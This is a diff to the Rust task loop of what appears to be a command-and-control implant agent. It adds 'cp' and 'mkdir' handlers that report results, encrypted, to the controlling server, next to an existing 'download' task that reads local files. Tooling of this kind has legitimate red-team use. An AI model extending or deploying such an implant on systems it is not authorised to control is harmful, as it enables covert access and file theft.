@@ -3,6 +3,7 @@
 //  - https://github.com/youyuanwu/winasio-rs/blob/c4bb4cd0d9bf7b0e944d2fd4b9487f2cfa7c4f9e/src/winhttp/mod.rs
 use regex::Regex;
 use std::{
+    fs,
     io::Read,
     thread, time
 };
@@ -181,6 +182,31 @@ pub async fn run(config: Config) -> Result<(), Error> {
                     }
                 }
             }
+            "cp" => {
+                let src = task_args[1].to_string();
+                let dest = task_args[2].to_string();
+
+                match fs::copy(src, dest) {
+                    Ok(_) => {
+                        post_task_result(
+                            &mut hconnect,
+                            "Copied successfully.".as_bytes(),
+                            agent_name.to_string(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                        ).await;
+                    }
+                    Err(e) => {
+                        post_task_result(
+                            &mut hconnect,
+                            e.to_string().as_bytes(),
+                            agent_name.to_string(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                        ).await;
+                    }
+                }
+            }
             "download" => {
                 match std::fs::File::open(task_args[1].as_str()) {
                     Ok(ref mut f) => {
@@ -265,6 +291,28 @@ pub async fn run(config: Config) -> Result<(), Error> {
                         post_task_result(
                             &mut hconnect,
                             output.as_bytes(),
+                            agent_name.to_string(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                        ).await;
+                    }
+                    Err(e) => {
+                        post_task_result(
+                            &mut hconnect,
+                            e.to_string().as_bytes(),
+                            agent_name.to_string(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                        ).await;
+                    }
+                }
+            }
+            "mkdir" => {
+                match fs::create_dir_all(task_args[1].as_str()) {
+                    Ok(_) => {
+                        post_task_result(
+                            &mut hconnect,
+                            "Directory created successfully.".as_bytes(),
                             agent_name.to_string(),
                             config.my_secret_key.clone(),
                             config.server_public_key.clone(),
